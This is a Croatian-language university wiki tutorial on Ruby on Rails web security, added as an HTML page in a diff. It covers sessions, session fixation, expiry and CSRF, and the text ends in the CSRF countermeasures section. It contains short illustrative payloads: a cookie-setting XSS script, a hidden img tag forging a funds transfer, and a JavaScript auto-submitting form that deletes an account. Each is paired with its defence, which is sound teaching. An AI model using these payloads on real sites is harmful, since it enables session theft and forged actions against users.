@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="hr" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<title>Sigurnosne značajke Ruby on Rails web aplikacija - SIS Wiki</title>
+<meta name="generator" content="MediaWiki 1.17.0" />
+<link rel="shortcut icon" href="http://security.foi.hr/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="../opensearch_desc.php" title="SIS Wiki (hr)" />
+<link rel="EditURI" type="application/rsd+xml" href="../api.php%3Faction=rsd" />
+<link title="Creative Commons" type="application/rdf+xml" href="http://security.foi.hr/wiki/index.php?title=Sigurnosne_zna%C4%8Dajke_Ruby_on_Rails_web_aplikacija&amp;action=creativecommons" rel="meta" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
+<link rel="alternate" type="application/atom+xml" title="SIS Wiki Atom izvor" href="../index.php%3Ftitle=Posebno:Nedavne_promjene&amp;feed=atom" />
+<link rel="stylesheet" href="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=mediawiki.legacy.commonPrint%252Cshared%257Cskins.vector&amp;only=styles&amp;skin=vector&amp;*.css" />
+<meta name="ResourceLoaderDynamicStyles" content="" />
+<!--[if lt IE 7]><style type="text/css">body{behavior:url("/wiki/skins/vector/csshover.min.htc")}</style><![endif]--></head>
+<body class="mediawiki ltr ns-0 ns-subject page-Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija skin-vector">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<!-- content -->
+		<div id="content">
+			<a id="top"></a>
+			<div id="mw-js-message" style="display:none;"></div>
+						<!-- firstHeading -->
+			<h1 id="firstHeading" class="firstHeading">Sigurnosne značajke Ruby on Rails web aplikacija</h1>
+			<!-- /firstHeading -->
+			<!-- bodyContent -->
+			<div id="bodyContent">
+				<!-- tagline -->
+				<div id="siteSub">Izvor: SIS Wiki</div>
+				<!-- /tagline -->
+				<!-- subtitle -->
+				<div id="contentSub"></div>
+				<!-- /subtitle -->
+																<!-- jumpto -->
+				<div id="jump-to-nav">
+					Skoči na: <a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#mw-head">orijentacija</a>,
+					<a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#p-search">traži</a>
+				</div>
+				<!-- /jumpto -->
+								<!-- bodytext -->
+				<p>Članovi tima:
+</p>
+<ul>
+<li>Ivan Miličević</li>
+<li>Andrej Kasić</li>
+</ul>
+<p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Andrej&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Andrej (stranica ne postoji)">Andrej Kasić</a> 15:53, 12. studenog 2015. (CET)
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Ivan.milicevic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Ivan.milicevic (stranica ne postoji)">Ivan Miličević</a> 15:06, 1. studenog 2015. (CET)
+</p><p><br />
+</p>
+<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Sadržaj</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Uvod"><span class="tocnumber">1</span> <span class="toctext">Uvod</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Aplikacija:_SimpleCMS"><span class="tocnumber">2</span> <span class="toctext">Aplikacija: SimpleCMS</span></a></li>
+<li class="toclevel-1 tocsection-3"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Sesije"><span class="tocnumber">3</span> <span class="toctext">Sesije</span></a>
+<ul>
+<li class="toclevel-2 tocsection-4"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#.C5.A0to_su_sesije"><span class="tocnumber">3.1</span> <span class="toctext">Što su sesije</span></a></li>
+<li class="toclevel-2 tocsection-5"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#ID_sesije"><span class="tocnumber">3.2</span> <span class="toctext">ID sesije</span></a></li>
+<li class="toclevel-2 tocsection-6"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Kra.C4.91a_sesije"><span class="tocnumber">3.3</span> <span class="toctext">Krađa sesije</span></a></li>
+<li class="toclevel-2 tocsection-7"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Spremanje_sesija"><span class="tocnumber">3.4</span> <span class="toctext">Spremanje sesija</span></a></li>
+<li class="toclevel-2 tocsection-8"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Session_fixation"><span class="tocnumber">3.5</span> <span class="toctext">Session fixation</span></a></li>
+<li class="toclevel-2 tocsection-9"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Istek_sesija"><span class="tocnumber">3.6</span> <span class="toctext">Istek sesija</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-10"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Cross-Site_Request_Forgery_.28CSRF.29"><span class="tocnumber">4</span> <span class="toctext">Cross-Site Request Forgery (CSRF)</span></a></li>
+<li class="toclevel-1 tocsection-11"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Preusmjeravanje_i_dokumenti"><span class="tocnumber">5</span> <span class="toctext">Preusmjeravanje i dokumenti</span></a>
+<ul>
+<li class="toclevel-2 tocsection-12"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Preusmjeravanje"><span class="tocnumber">5.1</span> <span class="toctext">Preusmjeravanje</span></a></li>
+<li class="toclevel-2 tocsection-13"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Upload_datoteka"><span class="tocnumber">5.2</span> <span class="toctext">Upload datoteka</span></a></li>
+<li class="toclevel-2 tocsection-14"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Preuzimanje_dokumenata"><span class="tocnumber">5.3</span> <span class="toctext">Preuzimanje dokumenata</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-15"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Sigurnost_administracijskog_su.C4.8Delja"><span class="tocnumber">6</span> <span class="toctext">Sigurnost administracijskog sučelja</span></a></li>
+<li class="toclevel-1 tocsection-16"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Upravljanje_Korisnicima"><span class="tocnumber">7</span> <span class="toctext">Upravljanje Korisnicima</span></a>
+<ul>
+<li class="toclevel-2 tocsection-17"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Brute-Forcing_Ra.C4.8Duni"><span class="tocnumber">7.1</span> <span class="toctext">Brute-Forcing Računi</span></a></li>
+<li class="toclevel-2 tocsection-18"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Kra.C4.91a_Ra.C4.8Duna"><span class="tocnumber">7.2</span> <span class="toctext">Krađa Računa</span></a>
+<ul>
+<li class="toclevel-3 tocsection-19"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Lozinke"><span class="tocnumber">7.2.1</span> <span class="toctext">Lozinke</span></a></li>
+<li class="toclevel-3 tocsection-20"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#E-Mail"><span class="tocnumber">7.2.2</span> <span class="toctext">E-Mail</span></a></li>
+<li class="toclevel-3 tocsection-21"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Drugo"><span class="tocnumber">7.2.3</span> <span class="toctext">Drugo</span></a></li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-22"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#CAPTCHA"><span class="tocnumber">7.3</span> <span class="toctext">CAPTCHA</span></a></li>
+<li class="toclevel-2 tocsection-23"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Prijava_.28logging.29"><span class="tocnumber">7.4</span> <span class="toctext">Prijava (logging)</span></a></li>
+<li class="toclevel-2 tocsection-24"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Regularni_izrazi"><span class="tocnumber">7.5</span> <span class="toctext">Regularni izrazi</span></a></li>
+<li class="toclevel-2 tocsection-25"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Eskalacija_Privilegija_.28Privilege_Escalation.29"><span class="tocnumber">7.6</span> <span class="toctext">Eskalacija Privilegija (Privilege Escalation)</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-26"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Injection"><span class="tocnumber">8</span> <span class="toctext">Injection</span></a>
+<ul>
+<li class="toclevel-2 tocsection-27"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Whitelists_protiv_Blacklists"><span class="tocnumber">8.1</span> <span class="toctext">Whitelists protiv Blacklists</span></a></li>
+<li class="toclevel-2 tocsection-28"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#SQL_injection"><span class="tocnumber">8.2</span> <span class="toctext">SQL injection</span></a>
+<ul>
+<li class="toclevel-3 tocsection-29"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Uvod_2"><span class="tocnumber">8.2.1</span> <span class="toctext">Uvod</span></a></li>
+<li class="toclevel-3 tocsection-30"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Zaobila.C5.BEenje_Autorizacije"><span class="tocnumber">8.2.2</span> <span class="toctext">Zaobilaženje Autorizacije</span></a></li>
+<li class="toclevel-3 tocsection-31"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Protumjere"><span class="tocnumber">8.2.3</span> <span class="toctext">Protumjere</span></a></li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-32"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Cross-Site_Scripting_.28XSS.29"><span class="tocnumber">8.3</span> <span class="toctext">Cross-Site Scripting (XSS)</span></a>
+<ul>
+<li class="toclevel-3 tocsection-33"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Ulazne_To.C4.8Dke"><span class="tocnumber">8.3.1</span> <span class="toctext">Ulazne Točke</span></a></li>
+<li class="toclevel-3 tocsection-34"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#HTML.2FJavaScript_Injection"><span class="tocnumber">8.3.2</span> <span class="toctext">HTML/JavaScript Injection</span></a>
+<ul>
+<li class="toclevel-4 tocsection-35"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Kra.C4.91a_Kola.C4.8Di.C4.87a"><span class="tocnumber">8.3.2.1</span> <span class="toctext">Krađa Kolačića</span></a></li>
+<li class="toclevel-4 tocsection-36"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Protumjere_2"><span class="tocnumber">8.3.2.2</span> <span class="toctext">Protumjere</span></a></li>
+<li class="toclevel-4 tocsection-37"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Obfuscation_and_Encoding_Injection"><span class="tocnumber">8.3.2.3</span> <span class="toctext">Obfuscation and Encoding Injection</span></a></li>
+</ul>
+</li>
+<li class="toclevel-3 tocsection-38"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Primjeri_iz_Prakse"><span class="tocnumber">8.3.3</span> <span class="toctext">Primjeri iz Prakse</span></a></li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-39"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#CSS_Injection"><span class="tocnumber">8.4</span> <span class="toctext">CSS Injection</span></a></li>
+<li class="toclevel-2 tocsection-40"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Ajax_Injection"><span class="tocnumber">8.5</span> <span class="toctext">Ajax Injection</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-41"><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#Literatura"><span class="tocnumber">9</span> <span class="toctext">Literatura</span></a></li>
+</ul>
+</td></tr></table>
+<h2> <span class="mw-headline" id="Uvod"> Uvod </span></h2>
+<p>Web aplikacije omogućuju brojnim poduzećima da obavljaju svoje djelatnosti putem Interneta, a također omogućuju i privatnim korisnicima da obavljaju razne poslove, kao što su kupovina, mobilno bankarstvo, komunikacija, ali i zabava i razonoda. 
+</p><p>Izrada takvih aplikacija danas je moguća u velikom broju programskih jezika i razvojnih okruženja (eng. <i>framework</i>) kao što su PHP, ASP.Net, Python i Django, a veliku popularnost ima i Ruby on Rails kojim ćemo se u ovom radu baviti. 
+</p><p>Ruby on Rails stekao je veliku naklonost programerske zajednice budući da je riječ o okruženju u kojemu je moguće razvijati vrlo brzo (<i>Rapid application development</i>), omogućeno je generiranje elemenata, čak i dijelova administracijskog sučelja kroz nekoliko linija u Terminalu. Taj postupak se naziva <i>scaffolding</i>.
+</p><p>Brojni veliki servisi u današnje vrijeme odabrali su upravo Ruby on Rails za svoje razvojno okruženje, a neki od najpoznatijih su Github, AirBnB, Twitch, Zendex i Shopify.
+</p><p>U ovom radu usmjerit ćemo se na sigurnosni aspekt web aplikacija. Treba naglasiti da ne postoji neko razvojno okruženje koje je najsigurnije, nego sva ovise prvenstveno o ljudima i načinu na koji ih koriste.  Međutim, Ruby on Rails sadrži određene metode koje pružaju dobru zaštitu u određenim aspektima, kao što je primjerice SQL Injection, CSRF i slično.
+</p><p>Sigurnost web aplikacija odnosi se na više slojeva: web servera, baze podataka i same aplikacije, a najveći broj napada upravo se događa putem same aplikacije, a neke od najčešćih prijetnji su otimanje korisničkog računa, zaobilaženje kontrole pristupa, pregled i izmjena povjerljivih podataka i slično. Kako bi bili spremni obraniti se od napada, moramo ih i sami razumjeti i upoznati kako bi mogli naći prave protumjere.
+</p>
+<h2> <span class="mw-headline" id="Aplikacija:_SimpleCMS"> Aplikacija: <b>SimpleCMS</b></span></h2>
+<p>Primjere pojedinih mjera pokušali smo implementirati u aplikaciji SimpleCMS (<a href="https://github.com/Ivan1223/rcms" class="external text" rel="nofollow">Github</a>) Riječ je o aplikaciji izrađenoj u <i>frameworku</i> Ruby on Rails, a omogućuje nekoliko glavnih funkcija: 
+</p>
+<ul>
+<li>dodavanje administratorskog računa te izmjena i brisanje njegovog profila</li>
+<li>dodavanje, izmjena i brisanje tema</li>
+<li>dodavanje, izmjena i brisanje stranica unutar teme</li>
+<li>dodavanje, izmjena i brisanje sekcija unutar stranica</li>
+</ul>
+<table style="margin: 0 auto;">
+<tr>
+<td> <div class="thumb tright"><div class="thumbinner" style="width:302px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:SimpleCMS-home.jpg" class="image"><img alt="SimpleCMS Home Page" src="../images/thumb/4/47/SimpleCMS-home.jpg/300px-SimpleCMS-home.jpg" width="300" height="164" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:SimpleCMS-home.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div></div></div></div>
+</td>
+<td> <div class="thumb tright"><div class="thumbinner" style="width:302px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:SimpleCMS_Admin_Users.jpg" class="image"><img alt="SimpleCMS Admin area" src="../images/thumb/6/6b/SimpleCMS_Admin_Users.jpg/300px-SimpleCMS_Admin_Users.jpg" width="300" height="158" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:SimpleCMS_Admin_Users.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div></div></div></div>
+</td>
+<td> <div class="thumb tright"><div class="thumbinner" style="width:302px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:SimpleCMS_Subjects.jpg" class="image"><img alt="SimpleCMS Subjects area" src="../images/thumb/4/46/SimpleCMS_Subjects.jpg/300px-SimpleCMS_Subjects.jpg" width="300" height="158" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:SimpleCMS_Subjects.jpg" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div></div></div></div>
+</td></tr></table>
+<h2> <span class="mw-headline" id="Sesije"> Sesije </span></h2>
+<h3> <span class="mw-headline" id=".C5.A0to_su_sesije"> Što su sesije </span></h3>
+<p>Svaki puta kada novi korisnik pristupi aplikaciji, Rails kreira novu sesiju automatski, a kada joj pristupi postojeći korisnik tada se učita postojeća sesija koja sadrži podatke o tom korisniku. Sesija može spremiti male količine podataka o korisniku, kao što su user id trenutno prijavljenog korisnika, sadržaj njegove shopping kartice i slično. One omogućuju da korisnik izvršava akcije na web aplikaciji bez potrebe da kod svakog zahtjeva prema serveru mora obaviti identifikaciju ili autentifikaciju, nego to radi samo jednom.
+</p><p>Sesija se obično sastoji od hasha vrijednosti i ID-a koji je obično string duljine 32 znaka i služi za identificiranje hasha. Svaki kolačić koji se šalje korisniku u preglednik uključuje taj ID, a jednako tako i kod svakog zahtjeva korisnika preglednik ga šalje poslužitelju.
+</p><p>Spremanje i dohvaćanje vrijednosti iz sesije dohvaćaju se na sljedeći način putem metode session:
+</p>
+<pre>
+session[:user_id] = @current_user.id
+
+User.find(session[:user_id])
+</pre>
+<p><br />
+</p>
+<h3> <span class="mw-headline" id="ID_sesije"> ID sesije </span></h3>
+<p>ID sesije je MD5 hash vrijednost duljine 32 bytea. Ta hash vrijednost sastoji se od trenutnog vremena, slučajnog broja između 0 i 1, ID-a procesa Ruby interpretera i stringa. Trenutno nije moguće brute-force napadom doći do tog ID-a.
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Kra.C4.91a_sesije"> Krađa sesije </span></h3>
+<p>Krađa sesije ili session hijacking je napad u kojem napadač ukrade ID sesije određenog korisnika te na taj način koristi aplikaciju kao taj korisnik.
+</p><p>Velik broj web aplikacija koristi autentifikacijski sustav u kojem korisnik postavlja korisničko ime i lozinku nakon čega aplikacija provjerava te podatke i sprema odgovarajući korisnikov ID u hash sesije <code>(session[:user_id])</code>. Na taj način sesija postaje važeća i kod svakog sljedećeg zahtjeva ona učitava korisnika identificiranog s tim ID-jem bez potrebe za novom autentifikacijom. ID sesije u kolačiću identificira sesiju. Kolačić tada služi kao trajna autentifikacija za web aplikaciju. Bilo tko, tko dođe do tuđeg kolačića može koristiti aplikaciju u tuđe ime, a to može dovesti do teških posljedica. 
+</p><p><br />
+U nastavku su neki od načina krađe sesije i moguće mjere protiv toga:
+</p>
+<ul>
+<li>Moguće je pratiti nekritpiranu bežićnu mrežu te na taj način doći do kolačića drugog korisnika. Zato je bitno da programer pruži sigurnu mrežu putem SSL-a, a u Railsu je moguće uvijek forsirati SSL konekciju u config dokumentu aplikacije:
+<code>config.force_ssl = true</code>
+</li>
+<li>Mnogi ljudi ne čiste kolačiće iz svog preglednika nakon što aplikaciji pristupaju na tuđem računalu ili na javnim mjestima. Ako se korisnik ne odjavi sa servisa, moguće ga je koristiti kao taj korisnik.</li>
+<li>Mnogi cross-site scripting (XSS) napadi također su usmjereni na dohvaćanje korisnikovog kolačića.</li>
+<li>Mogući su i session fixation napadi o kojima ćemo govoriti malo kasnije.</li>
+</ul>
+<p><br />
+Neke od ključnih smjernica za korištenje sesija su sljedeće:
+</p>
+<ul>
+<li><b>Ne spremati velike objekte u sesiju.</b> Ne preporuča se spremanje bilo čega osim osnovnih Ruby objekata, jer u suprotnom može dolaziti do grešaka između zahtjeva prema poslužitelju. Umjesto toga, preporuča ih se spremati u bazu podataka, a njihov ID u sesiju. Na ovaj način se eliminiraju problemi sa sinkronizacijom i spriječava se popunjavanje mjesta za pohranu u sesiji.
+</li>
+<li><b>Kritični podaci se ne trebaju spremati u sesiji.</b> Kada korisnik obriše kolačić ti će se podaci obrisati, a jednako tako kod spremanja sesije na klijentskoj strani, korisnik može čitati podatke.</li>
+</ul>
+<p><br />
+</p>
+<h3> <span class="mw-headline" id="Spremanje_sesija"> Spremanje sesija </span></h3>
+<p>Aplikacije sadrže sesiju za svakog korisnika, a u njih je moguće spremiti malu količinu podataka koje su bitne za razmjenu između zahtjeva. Dostupne samo unutar Controllera i Viewa i mogu koristiti jedan od navedenih mehanizama pohrane:
+</p>
+<ul>
+<li><code>ActionDispatch::Session::CookieStore</code> – sprema podatke na klijenta</li>
+<li><code>ActionDispatch::Session::CacheStore </code> – sprema podatke u Rails cache</li>
+<li><code>ActionDispatch::Session::ActiveRecordStore</code> – sprema podatke u bazu podataka korištenjem Active Recorda</li>
+<li><code>ActionDispatch::Session::MemCacheStore</code> - legacy implementacija; preporuča se korištenje CacheStore</li>
+</ul>
+<p><br />
+Sve sesije koriste kolačić za spremanje jedinstvenog ID-a za svaku sesiju, Rails ne omogućava slanje session ID-a unutar URL-a budući da to nije sigurno. Kod većine spremanja, ID se koristi za pretraživanje sesije na serveru, npr. u tablici u bazi podataka.
+</p><p><br />
+Zadani način spremanja je <b>CookieStore</b> te se hash sprema direktno u kolačić na klijentskoj strani. Poslužitelj prihvaća hash sesije iz kolačića te eliminira porebu za ID-jem sesije što ubrzava aplikaciju, ali nije najsigurniji način spremanja i treba misliti o idućem:
+</p>
+<ul>
+<li>Kolačići su limitirani na striktnu veličinu od 4 KB. Preporuka je spremati samo ID trenutnog korisnika iz baze u sesiji.</li>
+<li>Klijent može vidjeti sve podatke iz sesije jer su spremljeni u čistom tekstu, odnosno Base64-enkodirani, tj. nisu kriptirani. Kako bi se spriječilo petljanje po sesiji (<i>session tampering</i>), računa se sažetak sesije sa tajnim ključem koji se nalazi na poslužitelju te se dodaje na kraj kolačića.</li>
+</ul>
+<p>Sigurnost pohrane sesije ovisi o tajnom ključu koji se koristi i na temelju kojeg se računa sažetak. Predlaže se korištenje ključa duljine od barem 30 znakova, koji nije trivijalan te se ne nalazi u <i>dictionaryju</i>.
+</p><p><code>secrets.secret_key_base</code> – koristi se za definiranje ključa koji će se koristiti za provjeru sesija unutar aplikacije kako bi se spriječilo petljanje po sesiji. Inicijalizacija tog ključa radi se u config/secrets.yml fileu.
+</p>
+<pre>
+development:
+  secret_key_base: a75d...
+ 
+test:
+  secret_key_base: 492f...
+ 
+production:
+  secret_key_base: &lt;%= ENV[&quot;SECRET_KEY_BASE&quot;]&#160;%&gt;
+</pre>
+<p>Jedan od mogućih napada prilikom korištenja CookieStorea je <i>replay attack</i>. On je moguć kada se u kolačiću nalaze dodatni podaci, osim ID-ja, kao npr. informacije o vrijednosti sredstava koje korisnik ima na raspolaganju. Nakon što obavi kupnju, iznos sredstava se mijenja i sprema natrag u sesiju, međutim on tada može kopirati početni kolačić te se vratiti na sredstva koja je imao prije kupovine. Ovo možemo spriječiti korištenjem <code>ActiveRecordStore</code> na način da se sredstva spremaju u bazu, a sesija sadrži samo ID trenutno prijavljenog korisnika.
+</p><p>Kod spremanja u bazu treba biti oprezan kada se kreiraju podaci sesije jer inače možemo popuniti bazu beskorisnim sesijama, a također ne možemo biti sigurni kako će se baza ponašati kada bude puna podataka iz sesija.
+</p><p>Treba biti svjestan da ne postoji savršen način spremanja sesija te treba dobro odvagnuti koju vrstu koristiti.
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Session_fixation"> Session fixation </span></h3>
+<p>Napad se temelji na principu da napadač izmijeni ID korisnika na onaj ID koji mu je poznat, a zatim prisili korisnika da iskoristi taj promijenjeni ID. 
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Session_fixation.png" class="image"><img alt="Session fixation" src="../images/thumb/8/8b/Session_fixation.png/350px-Session_fixation.png" width="350" height="287" /></a>
+</p><p>Postupak je sljedeći:
+</p>
+<ul>
+<li>Napadač kreira validan ID sesije – otvori početnu stranicu web aplikacije i uzme ID sesije iz kolačića koji mu je poslužitelj vratio.</li>
+<li>Nakon toga napadać povremeno posjećuje aplikaciju kako bi izbjegao istjecanje sesije.</li>
+<li>Putem XSS napada prisili korisnika na pristup stranici koja je zaražena te mu zamijeni ID sesije sa onim koji im je poznat. Primjer tog napada je sljedeći: <code>&lt;script&gt;document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";&lt;/script&gt;</code>.</li>
+<li>Kako trenutna sesija žrtve nije korištena, aplikacija ga traži da ponovno izvrši autentifikaciju. </li>
+<li>Od ovog trenutka žrtva i napadač koriste aplikaciju pomoću jednake sesije. Ta sesija je valjana, a žrtva nije ni uočila napad.</li>
+</ul>
+<p><br />
+Najbolja mjere protiv takvog napada je izdavanje novog ID-ja sesije i označavanja starog nevažećim nakon uspješne prijave. Na taj način, napadač više neće moći koristiti tu sesiju koju je podmetnuo žrtvi. Ova protumjera također je korisna i kod <i>session hijackinga</i>. Obrana je iznimno jednostavna, potrebno je samo koristiti navedenu metodu:
+</p>
+<pre>reset_session</pre>
+<h3> <span class="mw-headline" id="Istek_sesija"> Istek sesija </span></h3>
+<p>Postavljanje isteka sesija je bitno jer inače samo povećavamo vrijeme u kojem napadači mogu izvršiti napade kao što su Cross-site request forgery (CSRF), session hijacking i session fixation.
+</p><p>Jedna od mogućnosti je postavljanje vremena kada će kolačić sa ID-jem sesije isteći. Međutim, to nije potpuno rješenje jer klijent, odnosno u većini slučajeva napadač, može izmijeniti kolačiće koji se nalaze u njegovom Web pregledniku. Sigurniji način je postavljati istek sesije na poslužitelju. Jedna od mogućnosti je korištenje iduće metode: <code>Session.sweep("15 minutes")</code>. Istek sesije će se dogoditi nakon što smo je koristili duže od 15 minuta.
+</p>
+<pre>
+class Session &lt; ActiveRecord::Base
+  def self.sweep(time = 1.hour)
+    if time.is_a?(String)
+      time = time.split.inject { |count, unit| count.to_i.send(unit) }
+    end
+ 
+    delete_all &quot;updated_at &lt; '#{time.ago.to_s(:db)}'&quot;
+  end
+end
+</pre>
+<p>Kod <i>session fixation</i> napada naglašeno je kako napadač mora održavati sesiju da ne istekne. U slučaju da napadač zadržava sesiju svakih par minuta, može je održati zauvijek, iako smo poduzeli akciju za istjecanje sesija. Moguće rješenje je dodavanje stupca <i>created_at</i> u tablici baze podataka o sesijama. Na taj način možemo brisati sesije koje su nastale davno. U sweep. metodu možemo dodati idući kod:
+</p>
+<pre>
+delete_all &quot;updated_at &lt; '#{time.ago.to_s(:db)}' OR
+  created_at &lt; '#{2.days.ago.to_s(:db)}'&quot;
+</pre>
+<h2> <span class="mw-headline" id="Cross-Site_Request_Forgery_.28CSRF.29"> Cross-Site Request Forgery (CSRF) </span></h2>
+<p>Prema OWASP-u, CSRF je napad koji tjera web preglednik prijavljenog korisnika da šalje krivotvorene HTTP zahtjeve prema ranjivoj web aplikaciji. To uključuje i žrtvin kolačić iz sesije i ostale informacije vezane uz autentifikaciju. Na taj način, napadač može prisiliti žrtvin preglednik da generira zahtjeve za koje će ranjiva aplikacija misliti da su legitimno došli od žrtve. 
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Csrf.png" class="image"><img alt="CSRF napad" src="../images/0/03/Csrf.png" width="485" height="463" /></a>
+</p><p>Aplikacija omogućuje korisniku da podnese zahtjev za promjenu stanja koji ne sadrži ništa tajno. Na primjer: 
+</p>
+<pre>http://example.com/app/transferFunds?amount=1500&amp;destinationAccount=4673243243</pre>
+<p>Sada napadač može kreirati zahtjev koji će prebaciti novac sa žrtvinog računa na njegov te ga ugraditi unutar slike (<i>image taga</i>), <i>iframea</i> ili slično na nekoj od stranica koje su pod kontrolom napadača. U slučaju da žrtva posjeti neku od napadačevih stranica dok je još uvijek prijavljen na example.com, krivotovreni zahjevi će automatski sadržavati informacije o njegovoj sesiji te na taj način autorizirati napadačev zahtjev.
+</p>
+<pre>
+&lt;img src=&quot;http://example.com/app/transferFunds?amount=1500&amp;destinationAccount=attackersAcct#&quot; width=&quot;0&quot; height=&quot;0&quot; /&gt;</pre>
+<p>Još jedan od načina za napad CSRF-om je i putem HTTP POST zahjeva. Moguće ga je poslati automatski na način da se forma koja će zahjev izvršiti kreira dinamički putem Javascripta. 
+</p>
+<pre>
+&lt;a href=&quot;http://www.harmless.com/&quot; onclick=&quot;
+  var f = document.createElement('form');
+  f.style.display = 'none';
+  this.parentNode.appendChild(f);
+  f.method = 'POST';
+  f.action = 'http://www.example.com/account/destroy';
+  f.submit();
+  return false;&quot;&gt;To the harmless survey&lt;/a&gt;
+</pre>
+<p>Također je moguće takav napad izvršiti i bez potrebe da se posjeti neku poveznicu, npr. možemo unutar slike na stranici postaviti Javascript onMouseOver event prilikom kojeg će se forma dinamički generirati, a zatim i potvrditi čime će se izvršiti akcija koja je opasna za korisnika kao što je brisanje računa, slanje uplate na tuđi račun i slično.
+</p>
+<pre>&lt;img src=&quot;http://www.harmless.com/img&quot; width=&quot;400&quot; height=&quot;400&quot; onmouseover=&quot;...&quot; /&gt;</pre>
+<p><b>Kako se zaštititi?</b>
+</p><p>Neke od osnovnih mogućnosti kako se moguće zaštititi od CSRF napada jesu implementiranje sigurnosnog tokena koji će se nalaziti unutar skrivenog input polja, a koji je jedinstven za svaki zahtjev prema poslužitelju. Još neke od mogućnosti su traženje korisnika da se ponovno prijavi ili se koristi CAPTCHA kako bi se stvarno dokazalo da navedeni zahtjev traži upravo taj korisnik.
